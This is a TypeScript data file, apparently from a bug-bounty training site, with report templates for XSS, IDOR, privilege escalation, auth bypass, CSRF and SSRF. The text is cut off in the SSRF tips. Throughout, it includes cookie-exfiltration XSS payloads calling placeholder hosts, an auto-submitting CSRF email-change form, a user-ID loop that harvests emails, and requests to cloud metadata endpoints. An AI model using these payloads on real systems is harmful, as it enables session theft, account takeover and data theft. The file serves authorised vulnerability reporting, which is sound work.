import type { ReconChapter } from "./recon-flow-data"

export const reportingChapters: ReconChapter[] = [
  {
    id: "xss-templates",
    number: 1,
    title: "XSS — Report Templates",
    subtitle: "Reflected, Stored, DOM, and Blind XSS — four complete templates ready to submit",
    color: "oklch(0.55 0.22 25)",
    overview:
      "Cross-Site Scripting reports are the most submitted bug bounty findings — and the most rejected for poor documentation. Each XSS variant requires different evidence. Reflected XSS needs a crafted URL. Stored XSS needs persistence proof. Blind XSS needs a collaborator callback. DOM XSS needs the browser's execution context. These templates cover every case with platform-approved formatting.",
    sections: [
      {
        title: "Reflected XSS Report Template",
        text: "Reflected XSS requires a working proof-of-concept URL that demonstrates script execution in the browser. The report must include the full request, the vulnerable parameter, the payload, and a screenshot of execution. Most programs also want to see that alert() fires without Same-Origin Policy violations.",
        commands: [
          {
            cmd: '## Reflected XSS — Report Template\n\n**Title:** Reflected Cross-Site Scripting (XSS) in [PARAMETER] parameter of [ENDPOINT]\n\n**Severity:** Medium (CVSS: 6.1 — AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)\n\n**Description:**\nThe `[PARAMETER]` parameter in `[ENDPOINT]` reflects user input without proper sanitization. An attacker can craft a URL that, when visited by a victim, executes arbitrary JavaScript in the victim\'s browser within the context of the application.\n\n**Impact:**\nAn attacker can steal session cookies, perform actions on behalf of the victim, deface pages, or redirect users to malicious sites — all without requiring any privileges or user interaction beyond clicking a link.\n\n**Steps to Reproduce:**\n1. Visit the following URL in a modern browser:\n   `https://target.com/[ENDPOINT]?[PARAMETER]=<script>alert(document.domain)</script>`\n2. Observe that the JavaScript alert box fires, showing the target\'s domain.\n3. The payload executes without any CSP violations or browser warnings.\n\n**Proof of Concept (Raw Request):**\n```http\nGET /[ENDPOINT]?[PARAMETER]=<script>alert(document.domain)</script> HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0\nAccept: text/html\n```\n\n**Remediation:**\n- Encode HTML entities: `<` → `&lt;`, `>` → `&gt;`, `\"` → `&quot;`, `\'` → `&#x27;`\n- Use Content-Security-Policy with strict nonce-based script-src\n- Apply context-aware output encoding based on the HTML context (attribute, tag, event handler)',
            desc: "Reflected XSS report template — includes CVSS, impact, reproduction steps, raw HTTP PoC, and remediation",
          },
          {
            cmd: "curl -v 'https://target.com/search?q=<script>alert(document.domain)</script>' 2>&1 | head -30",
            desc: "Generate the PoC request output — paste the response showing the injected script reflecting unfiltered",
          },
          {
            cmd: "curl -s -o /dev/null -w 'PoC URL length: %{size_request} bytes | Status: %{http_code}' 'https://target.com/search?q=<script>alert(document.domain)</script>'",
            desc: "Quick PoC verification — confirm the URL is valid and returns 200 before including in the report",
          },
          {
            cmd: "cat << 'EOF' > reflected-xss-poc.html\n<!DOCTYPE html><html><head><title>XSS PoC</title></head><body>\n<h2>Reflected XSS PoC</h2>\n<p>Click the link to trigger the vulnerability:</p>\n<a href=\"https://target.com/search?q=<script>alert(document.domain)</script>\" target=\"_blank\">Trigger XSS</a>\n<p>Or use this iframe:</p>\n<iframe src=\"https://target.com/search?q=<script>alert(1)</script>\" width=\"800\" height=\"400\"></iframe>\n</body></html>\nEOF",
            desc: "Self-contained HTML PoC file — send this to the program so they can open it locally and see the XSS fire",
          },
          {
            cmd: "cat << 'EOF' > xss-report-summary.txt\nVulnerability: Reflected XSS\nEndpoint: /search\nParameter: q\nPayload: <script>alert(document.domain)</script>\nCSP Status: No CSP / CSP Bypassed\nAuth Required: No\nUser Interaction: Click link\nCVSS: 6.1 (Medium)\nEOF",
            desc: "One-line summary block — paste at the top of your report for quick triage by the program's security team",
          },
        ],
        tips: [
          "Always include a screenshot of the alert box AND the URL bar showing the payload — proves it's not a self-XSS",
          "Use alert(document.domain) instead of alert(1) — it proves the script runs in the target's origin, not an iframe",
          "If CSP blocks alert(), use <img src=x onerror=print()> — print() often bypasses CSP where alert() doesn't",
          "Include the raw HTTP request from Burp or curl -v — programs want to see exactly what was sent to the server",
        ],
      },
      {
        title: "Stored XSS Report Template",
        text: "Stored XSS is the most severe XSS variant because it affects every visitor without user interaction. The report must prove persistence — the payload executes every time the page loads, not just once. Include a second visit to the same page without re-injecting the payload to demonstrate it's stored server-side.",
        commands: [
          {
            cmd: '## Stored XSS — Report Template\n\n**Title:** Stored Cross-Site Scripting (XSS) in [FIELD] of [PAGE] — affects all users\n\n**Severity:** High (CVSS: 8.7 — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N)\n\n**URL:** https://target.com/[VICTIM_PAGE]\n\n**Description:**\nThe `[FIELD]` field in `[PAGE]` stores user-supplied input and renders it on the page without sanitization. Unlike reflected XSS, no crafted link is needed — any user visiting the affected page will execute the payload automatically.\n\n**Impact:**\n- Automatic session hijacking for all visitors (no user interaction)\n- Phishing attacks by modifying the page content in real-time\n- Keylogging, form grabbing, and CSRF token theft for every user\n- Worm potential: the payload can self-replicate by posting the same payload back\n\n**Steps to Reproduce:**\n1. Submit the following payload in the `[FIELD]` field:\n   `<script>fetch("https://YOUR-SERVER/?c="+document.cookie)</script>`\n2. Navigate away from the page, then return to `https://target.com/[VICTIM_PAGE]`\n3. Observe that the payload executes again — no re-injection needed\n4. Check YOUR-SERVER logs for the incoming cookie — proves real data exfiltration\n\n**Proof of Concept:**\n[Attach screenshot showing the payload field and the executed script on reload]\n[Attach collaborator log showing the cookie callback]\n\n**Remediation:**\n- Apply output encoding based on HTML context\n- Use Content-Security-Policy with strict script-src\n- Sanitize input server-side using a library (DOMPurify, OWASP Java HTML Sanitizer)\n- Consider using a nonce-based CSP that renders stored scripts inert',
            desc: "Stored XSS report template — higher severity due to automatic execution without user interaction",
          },
          {
            cmd: "echo '<script>fetch(\"https://YOUR-SERVER/?c=\"+document.cookie)</script>' > stored-payload.txt && cat stored-payload.txt",
            desc: "Cookie-stealing stored XSS payload — paste this into the vulnerable field to demonstrate real data exfiltration",
          },
          {
            cmd: "tail -f /var/log/cookie-server.log | grep -i 'cookie'",
            desc: "Watch for incoming cookie callbacks on your server — screenshot this as proof of real-world impact",
          },
          {
            cmd: "cat << 'EOF' > stored-xss-evidence.sh\n#!/bin/bash\n# Step 1: Inject payload\ncurl -s -X POST 'https://target.com/profile/bio' -d 'bio=<script>document.cookie</script>' -H 'Cookie: SESSION' -o /dev/null -w 'Injection: %{http_code}\\n'\n# Step 2: Verify persistence (visit again)\ncurl -s 'https://target.com/profile/public' | grep -i 'script\\|<\\/script>'\necho 'If script tags appear in the HTML output, XSS is stored server-side'\nEOF",
            desc: "Evidence automation script: inject the payload, re-visit the page, and check if the script tag persists in HTML",
          },
          {
            cmd: "cat << 'EOF' > stored-xss-report-summary.txt\nVulnerability: Stored XSS\nLocation: User profile → bio field\nViewable at: /profile/public\nPayload: <script>fetch(\"https://SERVER/?c=\"+document.cookie)</script>\nPersistence: Confirmed (executes on page reload)\nVictim Impact: All visitors to /profile/public are affected automatically\nCVSS: 8.7 (High)\nEOF",
            desc: "Stored XSS summary block — highlight the persistence and automatic execution for the triage team",
          },
        ],
        tips: [
          "Prove persistence by visiting the page TWICE — first time injects, second time shows execution without re-injection",
          "Stored XSS on user profiles affects everyone who views the profile — mention the total user base for impact",
          "Use a cookie-stealer payload (not just alert()) to show real data exfiltration — programs reward demonstrated impact",
          "If the field is only visible to admins, this is still stored XSS (stored admin XSS) — document who can see the payload",
        ],
      },
      {
        title: "Blind XSS Report Template",
        text: "Blind XSS fires in an internal dashboard, admin panel, or support ticket system — you never see it execute. Your proof is the collaborator callback. This is the hardest XSS to confirm but often the highest payout. The report must prove the callback came from the target's infrastructure, not an external scanner.",
        commands: [
          {
            cmd: '## Blind XSS — Report Template\n\n**Title:** Blind Cross-Site Scripting (XSS) in [INPUT_FIELD] — triggers in internal admin panel\n\n**Severity:** High (CVSS: 8.2 — AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N)\n\n**Description:**\nThe `[INPUT_FIELD]` field in `[PAGE]` is vulnerable to blind XSS. User input is stored and later rendered by an internal system (admin panel, support dashboard, or moderation interface) without sanitization. The payload executes when an internal user views the affected page.\n\n**Impact:**\n- Session hijacking of admin/support accounts with elevated privileges\n- Internal network scanning from the victim\'s browser context\n- Access to internal tools, dashboards, and management interfaces\n- Data exfiltration from backend systems not exposed to the internet\n\n**Steps to Reproduce:**\n1. Set up a collaborator: `interactsh-client -v`\n2. Submit the following blind XSS payload in the `[INPUT_FIELD]`:\n   `<script>fetch("http://[YOUR-COLLABORATOR-URL]/exfil?q="+document.cookie)</script>`\n3. Wait for an internal user to view the submitted data\n4. [x] seconds/minutes/hours later, the collaborator receives a callback\n\n**Proof of Concept (Collaborator Log):**\n```\n[ATTACH SCREENSHOT OF INTERACTSH/BURP COLLABORATOR LOG]\n[INCLUDE DNS/HTTP callback evidence with timestamps]\n[NOTE: IP address of callback matches the target\'s infrastructure CIDR range]\n```\n\n**Remediation:**\n- Apply HTML encoding on all user-supplied data in internal interfaces\n- Implement strict CSP headers on admin panels\n- Sanitize input at the point of storage, not just display',
            desc: "Blind XSS report template — requires collaborator callback proof since you can't see execution directly",
          },
          {
            cmd: "interactsh-client -v 2>&1 | tee interactsh.log",
            desc: "Start Interactsh client with verbose logging — capture the exact DNS/HTTP callback as evidence",
          },
          {
            cmd: "curl -s -X POST 'https://target.com/support/ticket' -d 'message=<script>fetch(\"http://[INTERACTSH_URL]/?q=\"+document.cookie)</script>&subject=Blind+XSS+test' -H 'Cookie: SESSION'",
            desc: "Submit the blind XSS payload to a support ticket, feedback form, or report system — targets an internal viewer",
          },
          {
            cmd: "cat interactsh.log | grep -i 'http\\|dns' | head -10",
            desc: "Extract collaborator callback evidence — timestamp, type (HTTP/DNS), and the exfiltrated data if any",
          },
          {
            cmd: "cat << 'EOF' > blind-xss-evidence.txt\nCallback Evidence\n=================\nTime: $(date -u)\nCollaborator URL: [YOUR-INTERACTSH-ID]\nCallback Type: HTTP/DNS Request\nSource IP: [TARGET_IP_RANGE]\nExfiltrated Data: [cookie / page content if received]\nHeaders: [list of HTTP headers from callback]\n\nImpact Confirmation:\n- Admin panel is accessible from an internal network\n- JavaScript execution confirmed in internal browser\n- Cookie exfiltration from admin session confirmed\nEOF",
            desc: "Blind XSS evidence log — format the collaborator callback data into a clean evidence block for the report",
          },
        ],
        tips: [
          "Active callback within 5 minutes = automated system. Callback after hours = real admin reviewing the data",
          "Use multiple callback techniques: HTTP fetch, Image().src, DNS prefetch (via <link>) — some internal networks block HTTP",
          "Include the source IP of the callback in the report — match it to the target's known IP range to prove it's internal",
          "Blind XSS in support tickets affects the support team — mention that every ticket submitted triggers execution on their end",
        ],
      },
    ],
    tools: [
      {
        name: "interactsh",
        desc: "Collaborator callback service for blind XSS confirmation — captures HTTP, DNS, and SMTP interactions",
        install: "go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
        link: "https://github.com/projectdiscovery/interactsh",
      },
      {
        name: "curl",
        desc: "Send HTTP requests for PoC reproduction — include raw curl output in the report as evidence",
        install: "apt install curl",
        link: "https://curl.se/",
      },
      {
        name: "Burp Collaborator",
        desc: "Burp Suite's built-in collaborator client for OOB detection — generates unique subdomains for each test",
        link: "https://portswigger.net/burp/documentation/collaborator",
      },
    ],
    summary:
      "You now have four complete XSS report templates: reflected (with PoC URL), stored (with persistence proof), and blind (with collaborator callback evidence). Each template includes CVSS scoring, impact description, reproduction steps, and remediation — formatted for immediate submission to any bug bounty platform.",
  },
  {
    id: "access-control-templates",
    number: 2,
    title: "Access Control — Report Templates",
    subtitle: "IDOR, Privilege Escalation, and Auth Bypass reports with reproduction chains",
    color: "oklch(0.72 0.16 75)",
    overview:
      "Access control vulnerabilities pay the highest bounties because they directly lead to data breaches. But they're also the most scrutinized — programs want proof that you accessed another user's data, not your own. These templates focus on demonstrating unauthorized access with clear chain-of-custody evidence using two test accounts.",
    sections: [
      {
        title: "IDOR Report Template",
        text: "An IDOR report must prove you accessed data belonging to a DIFFERENT user using YOUR session. Create two accounts, capture both session tokens, and show that User A's session can read User B's data. The report must include both requests side-by-side with the different identifiers highlighted.",
        commands: [
          {
            cmd: '## IDOR — Report Template\n\n**Title:** Insecure Direct Object Reference (IDOR) in [ENDPOINT] — unauthorized access to [DATA_TYPE]\n\n**Severity:** High (CVSS: 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)\n\n**Description:**\nThe `[ENDPOINT]` endpoint accepts a user-supplied identifier (`[ID_PARAM]`) without verifying ownership. By substituting another user\'s ID, an attacker can access their [data type — profile, documents, orders] without authorization.\n\n**Two-Account Confirmation:**\n- Account A (victim): ID = [VICTIM_ID]\n- Account B (attacker): Session Cookie = [ATTACKER_SESSION]\n\n**Steps to Reproduce:**\n1. Log in as Account A (victim) and capture their user ID: `[VICTIM_ID]`\n2. Log in as Account B (attacker) and capture the session cookie\n3. Using Account B\'s session, send a request targeting Account A\'s ID:\n   `curl -s \'https://target.com/[ENDPOINT]/[VICTIM_ID]/[DATA]\' -H \'Cookie: [ATTACKER_SESSION]\'`\n4. Observe that the response contains Account A\'s private data\n\n**Impact:**\n- Unauthorized access to [COUNT] user records including [data types: PII, financial, medical]\n- Potential for mass data extraction by iterating through user IDs\n- [If applicable: ability to modify/delete another user\'s data]\n\n**Remediation:**\n- Replace user-supplied IDs with session-derived identifiers\n- Implement server-side ownership checks before returning data\n- Use UUIDs instead of sequential integers (defense-in-depth, not a complete fix)\n- Log and monitor access to sensitive endpoints for anomalous ID patterns',
            desc: "IDOR report template with two-account confirmation methodology — the gold standard for access control reports",
          },
          {
            cmd: "curl -s 'https://target.com/api/user/VICTIM_ID/profile' -H 'Cookie: ATTACKER_SESSION' | jq '{email: .email, role: .role, id: .id}'",
            desc: "IDOR PoC command — replace VICTIM_ID with another user's ID and ATTACKER_SESSION with your session cookie",
          },
          {
            cmd: "diff <(curl -s 'https://target.com/api/user/MY_ID/profile' -H 'Cookie: MY_SESSION' | jq -c) <(curl -s 'https://target.com/api/user/VICTIM_ID/profile' -H 'Cookie: MY_SESSION' | jq -c)",
            desc: "Two-user diff PoC: same session, two different user IDs — if output differs, IDOR is confirmed (same session accessed two users)",
          },
          {
            cmd: "cat << 'EOF' > idor-evidence.txt\nIDOR Confirmation — Two Account Method\n========================================\nVictim Account ID: [VICTIM_ID]\nAttacker Session: [ATTACKER_SESSION] (logged in as User B)\n\nRequest to Victim's Data:\nGET /api/user/[VICTIM_ID]/profile HTTP/1.1\nCookie: [ATTACKER_SESSION]\n\nResponse Highlights:\n- Email: victime@target.com (different from attacker's email)\n- Role: admin (if victim is admin, privilege escalation component)\n- Private fields exposed: [list fields]\n\nTotal Users Exposed: [COUNT] (verified by iterating IDs X through Y)\nEOF",
            desc: "IDOR evidence template — documents the exact request/response that confirms unauthorized access",
          },
          {
            cmd: "for id in $(seq 1000 1010); do echo \"User $id: $(curl -s \"https://target.com/api/user/$id/profile\" -H \"Cookie: SESSION\" | jq -r '.email // \"not found\"')\"; done",
            desc: "Batch IDOR PoC — iterate through user IDs and extract emails, proving mass data exposure in one command",
          },
        ],
        tips: [
          "Always use TWO accounts — one victim, one attacker. Programs reject reports that only show your own data",
          "Highlight the identifiers that differ between the two requests in red/yellow in your screenshots",
          "If you found the IDOR in a GraphQL endpoint, include the full query with aliases in the reproduction steps",
          "Mass IDOR (100+ records accessible) should be reported as Critical, not High — emphasize the data breach potential",
        ],
      },
      {
        title: "Privilege Escalation Report Template",
        text: "Privilege Escalation reports require demonstrating that a low-privilege user can access admin functionality. Create two accounts (user + admin), capture requests from the admin session, and replay them with the user session. The key is showing the same endpoint returns admin-only data regardless of who sends the request.",
        commands: [
          {
            cmd: '## Privilege Escalation — Report Template\n\n**Title:** Privilege Escalation — [ROLE] can access [ADMIN_FUNCTIONALITY]\n\n**Severity:** Critical (CVSS: 9.1 — AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)\n\n**Description:**\nThe `[ENDPOINT]` endpoint performs server-side admin checks on the client side but fails to enforce them server-side. A user with `[ROLE]` privileges can access and modify resources reserved for system administrators.\n\n**Steps to Reproduce:**\n1. Log in as a standard user and capture the session cookie\n2. Log in as an administrator and capture their session cookie\n3. Using the admin session, identify a privileged endpoint:\n   `curl -s \'https://target.com/admin/users/list\' -H \'Cookie: ADMIN_SESSION\'`\n4. Replay the same request using the standard user session:\n   `curl -s \'https://target.com/admin/users/list\' -H \'Cookie: USER_SESSION\'`\n5. Compare responses — if they return identical data, privilege escalation is confirmed\n\n**Impact:**\n- Unauthorized access to admin panel and sensitive functionality\n- Ability to create, modify, or delete user accounts\n- [If applicable: access to billing, configuration, or infrastructure management]\n\n**Remediation:**\n- Enforce server-side role checks on every endpoint, not just in the frontend\n- Use a centralized authorization middleware, not per-endpoint checks\n- Test role enforcement with automated tools (Autorize, AuthMatrix)\n- Audit all admin endpoints for missing role verification',
            desc: "Privilege Escalation report template — demonstrates role bypass by comparing admin vs user responses",
          },
          {
            cmd: "diff <(curl -s -H 'Cookie: USER_SESSION' 'https://target.com/admin/users' | jq -c .) <(curl -s -H 'Cookie: ADMIN_SESSION' 'https://target.com/admin/users' | jq -c .)",
            desc: "PrivEsc PoC: diff the response from user session vs admin session — if identical, admin auth is not enforced",
          },
          {
            cmd: "curl -s -X POST 'https://target.com/admin/users/create' -H 'Cookie: USER_SESSION' -H 'Content-Type: application/json' -d '{\"email\":\"pwned@test.com\",\"role\":\"admin\"}'",
            desc: "Escalation PoC: attempt to create an admin user using a standard user's session — proves privilege escalation",
          },
          {
            cmd: "cat << 'EOF' > privesc-evidence.txt\nPrivilege Escalation Confirmation\n==================================\nAdmin Endpoint: /admin/users/list\nAdmin Session: Status 200 — returned full user list (see admin-response.json)\nUser Session: Status 200 — returned IDENTICAL user list (see user-response.json)\n\nVerified Actions:\n[x] Read admin data\n[x] Create user with admin role\n[x] Delete existing user\n[x] Access system configuration\nEOF",
            desc: "Privilege escalation evidence template — track which admin actions are accessible from the user session",
          },
        ],
        tips: [
          "Include both responses (admin + user) side-by-side in the report — identical responses are the strongest proof",
          "Autorize is the best tool for finding privilege escalation — install it in Burp and let it auto-compare responses",
          "Test POST, PUT, and DELETE methods too — some endpoints enforce GET but not mutating methods",
          "Privilege escalation to admin is always Critical — don't undersell it as High",
        ],
      },
      {
        title: "Authentication Bypass Report Template",
        text: "Authentication bypass reports cover everything from direct access to protected pages (no cookie needed) to SQL injection in login forms that returns any account. These are the most severe access control issues. The template below covers the most common pattern: accessing authenticated endpoints without any session token.",
        commands: [
          {
            cmd: '## Authentication Bypass — Report Template\n\n**Title:** Authentication Bypass — [ENDPOINT] accessible without authentication\n\n**Severity:** Critical (CVSS: 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n\n**URL:** https://target.com/[AUTH_REQUIRED_ENDPOINT]\n\n**Description:**\nThe `[ENDPOINT]` endpoint is designed for authenticated users only but does not verify the session token server-side. Sending a request with no cookie, an expired cookie, or a manipulated cookie returns the same response as a valid authenticated request.\n\n**Impact:**\n- Full access to authenticated functionality without logging in\n- [If API: complete API access without authentication]\n- Potential for account takeover, data breach, or complete system compromise\n\n**Steps to Reproduce:**\n1. Attempt to access the endpoint WITHOUT any authentication:\n   `curl -s \'https://target.com/[ENDPOINT]\'`\n2. Now access it WITH a valid session:\n   `curl -s \'https://target.com/[ENDPOINT]\' -H \'Cookie: [VALID_SESSION]\'`\n3. Compare the two responses — if they match, authentication is not enforced\n\n**Additional Verification:**\n- Test with modified cookie: `curl -s \'https://target.com/[ENDPOINT]\' -H \'Cookie: session=invalid\'`\n- Test with expired cookie from a logged-out session\n- Test with different HTTP methods on the same endpoint\n\n**Remediation:**\n- Implement a centralized authentication middleware that checks session validity on every request\n- Use framework-level auth decorators/attributes rather than manual session checks\n- Apply authentication checks to ALL endpoints in the route, including nested resources\n- Conduct an auth audit: access every endpoint without credentials programmatically',
            desc: "Auth bypass report — covers unauthenticated access to protected endpoints with multi-method verification",
          },
          {
            cmd: "diff <(curl -s 'https://target.com/admin/dashboard') <(curl -s 'https://target.com/admin/dashboard' -H 'Cookie: ANY_SESSION')",
            desc: "Auth bypass PoC: compare no-auth response vs any-session response — if they match, auth is not enforced",
          },
          {
            cmd: "curl -s -o /dev/null -w '%{http_code}' 'https://target.com/admin/dashboard' && curl -s -o /dev/null -w ' | with session: %{http_code}' -H 'Cookie: invalid' 'https://target.com/admin/dashboard'",
            desc: "Quick auth check: compare HTTP status codes with and without a fake session cookie",
          },
          {
            cmd: "cat live-urls.txt | grep -i '/admin\\|/api\\|/dashboard\\|/internal\\|/manage' | httpx -silent -mc 200 -o unprotected-admin.txt",
            desc: "Scan for auth bypasses at scale: probe admin endpoints and filter for 200 responses (should be 302/401)",
          },
          {
            cmd: "curl -s 'https://target.com/api/internal/users' | head -5 && echo '---' && curl -s 'https://target.com/api/internal/users' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.dummy' | head -5",
            desc: "Test JWT auth bypass: compare no-auth vs fake-JWT — some backends only check JWT structure, not signature",
          },
        ],
        tips: [
          "Test with completely empty request (no headers, no cookies) — many apps rely on frontend to add auth headers",
          "Some endpoints accept GET unauthenticated but reject POST — test all HTTP methods for partial auth bypass",
          "JWT bypass is common: the server decodes the JWT without verifying the signature — test with a self-signed token",
          "Document exactly what a malicious actor can do without authentication — 'full API access' is stronger than 'access to 1 endpoint'",
        ],
      },
      {
        title: "CSRF Report Template",
        text: "Cross-Site Request Forgery (CSRF) lets an attacker perform state-changing actions on behalf of a victim without their consent. The classic PoC is a self-submitting HTML form. Modern CSRF requires bypassing SameSite cookies, custom headers, or CSRF tokens. The report must include the HTML PoC and demonstrate the action executes with the victim's session.",
        commands: [
          {
            cmd: '## CSRF — Report Template\n\n**Title:** Cross-Site Request Forgery (CSRF) in [ENDPOINT] — unauthorized [ACTION]\n\n**Severity:** Medium (CVSS: 6.5 — AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N)\n\n**Description:**\nThe `[ENDPOINT]` endpoint performs sensitive actions ([ACTION]) without requiring a CSRF token or validating origin headers. An attacker can craft a malicious page that, when visited by an authenticated user, performs this action on their behalf without their knowledge or consent.\n\n**Impact:**\n- Unauthorized [action: password change, email update, fund transfer, privilege escalation]\n- Account takeover when combined with email change functionality\n- Data modification or deletion without authorization\n\n**Steps to Reproduce:**\n1. Log in to the target application in one browser tab\n2. Open the following HTML file in a DIFFERENT browser tab:\n\n```html\n<html><body>\n<form action="https://target.com/[ENDPOINT]" method="POST">\n  <input type="hidden" name="[PARAM]" value="[VALUE]">\n</form>\n<script>document.forms[0].submit();</script>\n</body></html>\n```\n\n3. Observe that the action executed successfully using the victim\'s session\n4. The action completes without any CSRF token, captcha, or confirmation prompt\n\n**Proof of Concept (PoC HTML):**\n[Attach the PoC HTML file or paste it inline]\n[Attach screenshot of the action being executed from the attacker\'s page]\n\n**Remediation:**\n- Implement anti-CSRF tokens bound to the user session\n- Set SameSite=Lax or SameSite=Strict on session cookies\n- Validate Origin and Referer headers on server-side\n- Require re-authentication for sensitive actions (password change, 2FA disable)\n- Use Custom Request Headers (X-Requested-By) as a CSRF mitigation',
            desc: "CSRF report template with self-submitting HTML form PoC — the industry-standard way to demonstrate CSRF",
          },
          {
            cmd: "cat << 'EOF' > csrf-poc.html\n<html><body>\n<h2>CSRF PoC - Email Change</h2>\n<form action=\"https://target.com/api/user/email\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n  <input type=\"hidden\" name=\"confirm\" value=\"attacker@evil.com\">\n</form>\n<script>document.forms[0].submit();</script>\n</body></html>\nEOF",
            desc: "Self-submitting CSRF PoC HTML — change the action URL and hidden fields to match the vulnerable endpoint",
          },
          {
            cmd: "# Test SameSite cookie behavior\ncurl -s -I 'https://target.com' -o /dev/null -w '%header{set-cookie}' | grep -i 'samesite'",
            desc: "Check if the target's cookies have SameSite protection — missing SameSite=Lax/Strict means CSRF is more likely",
          },
          {
            cmd: "cat << 'EOF' > csrf-evidence.txt\nCSRF Confirmation\n==================\nVulnerable Endpoint: /api/user/email\nHTTP Method: POST\nAction Performed: Changed victim's email to attacker-controlled email\n\nCSRF Protections Bypassed:\n[x] CSRF Token — NOT required (no token parameter in request)\n[x] Origin Header — NOT validated (any origin works)\n[x] SameSite Cookie — [Lax / None / Not set]\n[x] Captcha — NOT required\n\nPoC: See attached csrf-poc.html\nOpen the HTML file in any browser while logged in to trigger the CSRF\nEOF",
            desc: "CSRF evidence template — document which protections were tested and bypassed",
          },
          {
            cmd: "curl -s -X POST 'https://target.com/api/user/email' -H 'Origin: https://evil.com' -H 'Referer: https://evil.com/csrf.html' -H 'Cookie: SESSION' -d 'email=pwned@evil.com' -o /dev/null -w 'Status: %{http_code}\\n'",
            desc: "CSRF via curl — set a fake Origin/Referer header to test if the server validates them (should reject if secure)",
          },
          {
            cmd: "# Modern CSRF bypass: SameSite=None + cross-site redirect\n# Some apps set SameSite=None which allows cross-site form submissions\ncurl -s -I 'https://target.com/auth/login' 2>&1 | grep -i 'samesite'",
            desc: "Check for SameSite=None — modern CSRF vector where the app explicitly allows cross-site requests",
          },
        ],
        tips: [
          "CSRF on email change = ATO in two steps: CSRF changes email → password reset goes to attacker's email",
          "Some frameworks (Angular, React) auto-include X-XSRF-TOKEN — test if omitting this header still works",
          "JSON APIs often miss CSRF protection because developers think 'JSON can't be form-submitted' — test with form enctype",
          "CSRF combined with XSS is Critical severity because the XSS bypasses all CSRF protections automatically",
        ],
      },
    ],
    tools: [
      {
        name: "jq",
        desc: "JSON processor for comparing API responses and extracting differences between user/admin sessions",
        install: "apt install jq",
        link: "https://jqlang.github.io/jq/",
      },
      {
        name: "Autorize",
        desc: "Burp extension for automatic authorization detection — compares responses across user sessions",
        link: "https://github.com/PortSwigger/autorize",
      },
      {
        name: "diff",
        desc: "Standard Unix diff tool for comparing authenticated vs unauthenticated responses side-by-side",
        link: "https://man7.org/linux/man-pages/man1/diff.1.html",
      },
    ],
    summary:
      "You now have complete templates for IDOR, privilege escalation, and authentication bypass reports — the three access control findings that pay the highest bounties. Each template uses the two-account methodology and includes side-by-side response comparison for bulletproof evidence.",
  },
  {
    id: "server-side-templates",
    number: 3,
    title: "Server-Side — Report Templates",
    subtitle: "SSRF, SQLi, RCE, and File Upload reports with full reproduction chains",
    color: "oklch(0.65 0.18 50)",
    overview:
      "Server-side vulnerabilities are the most technically complex to report. Programs need clear, step-by-step reproduction that they can follow without your specific setup. These templates focus on making every PoC reproducible with standard tools — curl, nuclei, and built-in OS commands — so the triage team can verify without asking you for clarification.",
    sections: [
      {
        title: "SSRF Report Template",
        text: "SSRF reports must prove the server made an outbound request to a destination you controlled. The strongest evidence is a collaborator callback showing the server's IP and the exact time of the request. For blind SSRF, the collaborator log is your only proof. For reflected SSRF, include the response data from the internal request.",
        commands: [
          {
            cmd: '## SSRF — Report Template\n\n**Title:** Server-Side Request Forgery (SSRF) in [PARAMETER] — internal network access\n\n**Severity:** High (CVSS: 8.6 — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)\n\n**Description:**\nThe `[PARAMETER]` parameter in `[ENDPOINT]` accepts a URL and fetches it server-side without proper validation. An attacker can make the server send requests to internal services, cloud metadata endpoints, and otherwise inaccessible systems.\n\n**Impact:**\n- Internal network scanning and service discovery\n- Access to cloud metadata service (IAM credentials on AWS/GCP/Azure)\n- Interaction with internal services (Redis, MySQL, Elasticsearch)\n- [If applicable: access to internal admin interfaces]\n\n**Steps to Reproduce:**\n1. Set up a collaborator listener: `interactsh-client -v`\n2. Inject the collaborator URL into the parameter:\n   `curl -s \'https://target.com/[ENDPOINT]?[PARAMETER]=http://[COLLABORATOR_URL]/test\'`\n3. Observe the incoming HTTP/DNS request in the collaborator logs\n4. Confirm the source IP matches the target\'s infrastructure range\n5. (Optional) Test internal access:\n   `curl -s \'https://target.com/[ENDPOINT]?[PARAMETER]=http://169.254.169.254/latest/meta-data/\'`\n\n**Proof of Concept:**\n[Collaborator log screenshot showing callback with timestamp]\n[If metadata accessible: attach the IAM role and credential response]\n\n**Remediation:**\n- Implement a strict allowlist of permitted URLs/domains\n- Block private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)\n- Disable gopher, dict, and file URI schemes — only allow https://\n- Use a URL parser that resolves DNS and checks the resolved IP, not just the hostname string',
            desc: "SSRF report template — covers collaborator-based detection with cloud metadata exploitation chain",
          },
          {
            cmd: "curl -s 'https://target.com/fetch?url=http://YOUR-COLLABORATOR.oastify.com/ssrf-test' -o /dev/null -w 'Status: %{http_code}\\n'",
            desc: "SSRF PoC command — inject collaborator URL into the parameter and check for callbacks",
          },
          {
            cmd: "cat interactsh.log | grep -i 'http\\|dns' | awk '{print $1, $2, $3, $4}'",
            desc: "Extract collaborator callback evidence — timestamps and source IPs for the SSRF proof",
          },
          {
            cmd: "cat << 'EOF' > ssrf-evidence.txt\nSSRF Confirmation\n=================\nVulnerable Endpoint: /fetch\nVulnerable Parameter: url\nPayload: http://[COLLABORATOR]/ssrf-test\n\nCollaborator Callback:\n- Time: [TIMESTAMP]\n- Type: HTTP Request\n- Source IP: [TARGET_IP] (matches target's ASN/range)\n- Request URI: /ssrf-test\n\nMetadata Access:\n- 169.254.169.254: [ACCESSIBLE / BLOCKED]\n- IAM Role: [ROLE_NAME if accessible]\n- Internal Ports: [LIST OF REACHABLE PORTS]\nEOF",
            desc: "SSRF evidence template with collaborator callback and metadata access status",
          },
        ],
        tips: [
          "Include the exact collaborator URL and the callback time — programs use this to verify in their own infrastructure",
          "If metadata is accessible, attach the FULL IAM credential response — don't redact it, the program needs the full data",
